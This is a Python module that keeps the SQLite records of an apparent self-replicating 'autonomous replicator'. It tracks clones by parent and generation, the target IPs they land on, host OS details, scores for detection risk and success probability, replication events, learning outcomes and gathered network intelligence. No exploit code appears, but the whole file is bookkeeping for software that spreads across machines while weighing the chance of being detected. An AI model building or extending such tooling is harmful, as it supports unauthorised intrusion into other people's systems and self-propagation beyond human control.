#!/usr/bin/env python3
"""
Database Handler
Manages all database operations for the autonomous replicator
"""

import asyncio
import logging
import json
from typing import Dict, List, Optional
from datetime import datetime
import aiosqlite

logger = logging.getLogger(__name__)


class DatabaseHandler:
    """
    Async database handler for replicator data
    """
    
    def __init__(self, db_path: str = 'data/replicator.db'):
        """
        Initialize database handler
        
        Args:
            db_path: Path to SQLite database
        """
        self.db_path = db_path
        self.connection = None
        
        logger.info(f"Database Handler initialized - Path: {db_path}")
    
    async def connect(self):
        """Establish database connection"""
        try:
            self.connection = await aiosqlite.connect(self.db_path)
            logger.info("Database connection established")
            
            # Initialize schema
            await self._initialize_schema()
            
        except Exception as e:
            logger.error(f"Database connection failed: {e}")
            raise
    
    async def disconnect(self):
        """Close database connection"""
        if self.connection:
            await self.connection.close()
            logger.info("Database connection closed")
    
    async def _initialize_schema(self):
        """Initialize database schema"""
        schema = """
        -- Clones table
        CREATE TABLE IF NOT EXISTS clones (
            clone_id TEXT PRIMARY KEY,
            parent_id TEXT,
            target_ip TEXT,
            generation INTEGER,
            created_at TEXT,
            last_contact TEXT,
            status TEXT,
            quantum_signature TEXT,
            FOREIGN KEY (parent_id) REFERENCES clones(clone_id)
        );
        
        -- Targets table
        CREATE TABLE IF NOT EXISTS targets (
            target_ip TEXT PRIMARY KEY,
            hostname TEXT,
            os_type TEXT,
            os_version TEXT,
            discovered_at TEXT,
            last_scanned TEXT,
            status TEXT
        );
        
        -- Target evaluations
        CREATE TABLE IF NOT EXISTS target_evaluations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_ip TEXT,
            risk_score REAL,
            security_risk REAL,
            detection_risk REAL,
            success_probability REAL,
            strategic_value REAL,
            recommendation TEXT,
            evaluated_at TEXT,
            FOREIGN KEY (target_ip) REFERENCES targets(target_ip)
        );
        
        -- Replication events
        CREATE TABLE IF NOT EXISTS replication_events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            parent_id TEXT,
            clone_id TEXT,
            target_ip TEXT,
            event_type TEXT,
            status TEXT,
            timestamp TEXT,
            details TEXT,
            FOREIGN KEY (parent_id) REFERENCES clones(clone_id),
            FOREIGN KEY (clone_id) REFERENCES clones(clone_id)
        );
        
        -- Learning data
        CREATE TABLE IF NOT EXISTS learning_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_ip TEXT,
            outcome TEXT,
            features TEXT,
            timestamp TEXT
        );
        
        -- Network intelligence
        CREATE TABLE IF NOT EXISTS network_intelligence (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_ip TEXT,
            intelligence_type TEXT,
            data TEXT,
            collected_at TEXT,
            FOREIGN KEY (target_ip) REFERENCES targets(target_ip)
        );
        
        -- Create indexes
        CREATE INDEX IF NOT EXISTS idx_clones_parent ON clones(parent_id);
        CREATE INDEX IF NOT EXISTS idx_clones_status ON clones(status);
        CREATE INDEX IF NOT EXISTS idx_targets_status ON targets(status);
        CREATE INDEX IF NOT EXISTS idx_evaluations_target ON target_evaluations(target_ip);
        CREATE INDEX IF NOT EXISTS idx_events_timestamp ON replication_events(timestamp);
        """
        
        await self.connection.executescript(schema)
        await self.connection.commit()
        logger.info("Database schema initialized")
    
    async def register_clone(self, clone_id: str, parent_id: Optional[str] = None,
                            target_ip: Optional[str] = None) -> bool:
        """
        Register a new clone
        
        Args:
            clone_id: Clone identifier
            parent_id: Parent clone ID (None for root)
            target_ip: Target IP address
            
        Returns:
            Success status
        """
        try:
            generation = await self.get_clone_generation(parent_id) if parent_id else 0
            generation += 1
            
            query = """
            INSERT INTO clones 
            (clone_id, parent_id, target_ip, generation, created_at, last_contact, status)
            VALUES (?, ?, ?, ?, ?, ?, ?)
            """
            
            now = datetime.now().isoformat()
            
            await self.connection.execute(
                query,
                (clone_id, parent_id, target_ip, generation, now, now, 'active')
            )
            await self.connection.commit()
            
            logger.info(f"Clone registered: {clone_id} (Gen {generation})")
            return True
            
        except Exception as e:
            logger.error(f"Failed to register clone {clone_id}: {e}")
            return False
    
    async def get_clone_generation(self, clone_id: Optional[str]) -> int:
        """
        Get generation number of clone
        
        Args:
            clone_id: Clone ID
            
        Returns:
            Generation number
        """
        if not clone_id:
            return 0
        
        query = "SELECT generation FROM clones WHERE clone_id = ?"
        
        async with self.connection.execute(query, (clone_id,)) as cursor:
            row = await cursor.fetchone()
            return row[0] if row else 0
    
    async def update_clone_status(self, clone_id: str, status: str):
        """
        Update clone status
        
        Args:
            clone_id: Clone ID
            status: New status
        """
        query = """
        UPDATE clones 
        SET status = ?, last_contact = ?
        WHERE clone_id = ?
        """
        
        await self.connection.execute(
            query,
            (status, datetime.now().isoformat(), clone_id)
        )
        await self.connection.commit()
    
    async def terminate_clone(self, clone_id: str):
        """
        Mark clone as terminated
        
        Args:
            clone_id: Clone ID
        """
        await self.update_clone_status(clone_id, 'terminated')
        logger.info(f"Clone {clone_id} marked as terminated")
    
    async def store_target_evaluation(self, target_ip: str, evaluation: Dict):
        """
        Store target evaluation
        
        Args:
            target_ip: Target IP
            evaluation: Evaluation data
        """
        query = """
        INSERT INTO target_evaluations
        (target_ip, risk_score, security_risk, detection_risk, 
         success_probability, strategic_value, recommendation, evaluated_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """
        
        await self.connection.execute(
            query,
            (
                target_ip,
                evaluation['risk_score'],
                evaluation['security_risk'],
                evaluation['detection_risk'],
                evaluation['success_probability'],
                evaluation['strategic_value'],
                evaluation['recommendation'],
                evaluation['evaluated_at']
            )
        )
        await self.connection.commit()
    
    async def store_learning_data(self, learning_entry: Dict):
        """
        Store learning data
        
        Args:
            learning_entry: Learning data entry
        """
        query = """
        INSERT INTO learning_data
        (target_ip, outcome, timestamp)
        VALUES (?, ?, ?)
        """
        
        await self.connection.execute(
            query,
            (
                learning_entry['target_ip'],
                learning_entry['outcome'],
                learning_entry['timestamp']
            )
        )
        await self.connection.commit()
    
    async def load_learning_data(self) -> List[Dict]:
        """
        Load historical learning data
        
        Returns:
            List of learning entries
        """
        query = """
        SELECT target_ip, outcome, timestamp
        FROM learning_data
        ORDER BY timestamp DESC
        LIMIT 1000
        """
        
        learning_data = []
        
        async with self.connection.execute(query) as cursor:
            async for row in cursor:
                learning_data.append({
                    'target_ip': row[0],
                    'outcome': row[1],
                    'timestamp': row[2]
                })
        
        return learning_data
    
    async def get_clone_statistics(self) -> Dict:
        """
        Get clone statistics
        
        Returns:
            Statistics dictionary
        """
        stats = {}
        
        # Total clones
        query = "SELECT COUNT(*) FROM clones"
        async with self.connection.execute(query) as cursor:
            row = await cursor.fetchone()
            stats['total_clones'] = row[0]
        
        # Active clones
        query = "SELECT COUNT(*) FROM clones WHERE status = 'active'"
        async with self.connection.execute(query) as cursor:
            row = await cursor.fetchone()
            stats['active_clones'] = row[0]
        
        # Max generation
        query = "SELECT MAX(generation) FROM clones"
        async with self.connection.execute(query) as cursor:
            row = await cursor.fetchone()
            stats['max_generation'] = row[0] if row[0] else 0
        
        # Total targets evaluated
        query = "SELECT COUNT(DISTINCT target_ip) FROM target_evaluations"
        async with self.connection.execute(query) as cursor:
            row = await cursor.fetchone()
            stats['targets_evaluated'] = row[0]
        
        return stats
    
    async def get_recent_clones(self, limit: int = 10) -> List[Dict]:
        """
        Get recent clones
        
        Args:
            limit: Number of clones to retrieve
            
        Returns:
            List of clone records
        """
        query = """
        SELECT clone_id, parent_id, target_ip, generation, 
               created_at, status
        FROM clones
        ORDER BY created_at DESC
        LIMIT ?
        """
        
        clones = []
        
        async with self.connection.execute(query, (limit,)) as cursor:
            async for row in cursor:
                clones.append({
                    'clone_id': row[0],
                    'parent_id': row[1],
                    'target_ip': row[2],
                    'generation': row[3],
                    'created_at': row[4],
                    'status': row[5]
                })
        
        return clones
    
    async def export_data(self, filename: str = 'export.json'):
        """
        Export all data to JSON
        
        Args:
            filename: Export filename
        """
        data = {
            'clones': await self._export_table('clones'),
            'targets': await self._export_table('targets'),
            'evaluations': await self._export_table('target_evaluations'),
            'learning_data': await self._export_table('learning_data')
        }
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        logger.info(f"Data exported to {filename}")
    
    async def _export_table(self, table_name: str) -> List[Dict]:
        """
        Export table to list of dictionaries
        
        Args:
            table_name: Table to export
            
        Returns:
            List of records
        """
        query = f"SELECT * FROM {table_name}"
        records = []
        
        async with self.connection.execute(query) as cursor:
            columns = [desc[0] for desc in cursor.description]
            async for row in cursor:
                records.append(dict(zip(columns, row)))
        
        return records
